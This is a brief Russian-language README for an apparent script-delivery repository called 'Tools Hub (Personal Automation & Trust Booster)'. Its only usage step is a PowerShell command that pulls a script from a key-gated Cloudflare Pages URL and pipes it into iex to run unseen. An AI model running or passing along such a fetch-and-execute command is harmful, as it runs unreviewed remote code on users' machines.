# Tools Hub (Personal Automation & Trust Booster)

Служебный репозиторий защищенного запуска скриптов через Cloudflare Pages и IRM.

## Использование с персональным ключом:
```powershell
irm "https://<ваш-проект>.pages.dev?key=akz2026" | iex
```
Без ключа `?key=akz2026` доступ заблокирован (403 Forbidden).
